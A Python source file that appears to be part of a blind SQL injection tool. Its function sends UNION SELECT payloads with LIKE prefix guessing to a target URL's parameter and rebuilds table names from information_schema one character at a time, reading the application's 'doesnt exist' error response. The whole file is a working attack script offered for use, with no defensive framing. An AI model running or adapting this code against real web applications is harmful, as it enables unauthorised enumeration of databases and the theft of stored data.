from requests import *
import json
import time
from colorama import Fore,init;init()

def tables(url,param,dbname):
    chars = "qwertyuiopasdfghjklzxcvbnm1234567890"
    
    req_t = post(url, data={param : "thisisboulshetttt"})
    res_t = json.loads(req_t.text)

    for i in res_t:
        if (res_t[i] == "doesnt exist"):  # you should change here `doesnt exist` to your error
            indx_name = i

    if(indx_name == None or indx_name == ""):
        print("TABLE=>cant get index name of return response pls change app/database.py line 13 `doesnt exist` error")
    else:
        pass
    
    char = 0
    table = ""
    tables = []
    print(Fore.LIGHTBLUE_EX + "tables : " + Fore.LIGHTGREEN_EX, end="")



    def gt(c):
        print(", "+c,end="")
        t = c
        ch = 0
        while(ch != len(chars)):
            # time.sleep(0.1)
            d = {param : f"0' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='{dbname}' AND table_name LIKE '{t}{chars[ch]}%'#"}
            req = post(url,data=d)
            res = json.loads(req.text)
            if(res[indx_name] == "doesnt exist"):
                ch+=1
            else:
                print(chars[ch],end="")
                t+=chars[ch]
                ch = 0
        return t



    while(char != len(chars)):
        if(len(table) > 0):
            d = {param : f"0' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='{dbname}' AND table_name LIKE '{table}{chars[char]}%'#"}
        else:
            d = {param : f"0' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='{dbname}' AND table_name LIKE '{chars[char]}%'#"}
        
        # time.sleep(0.1)
        req = post(url,data=d)
        res = json.loads(req.text)

        if(res[indx_name] == "doesnt exist"):
            char+=1
        else:
            t = gt(chars[char])
            tables.append(t)
            char+=1

    return tables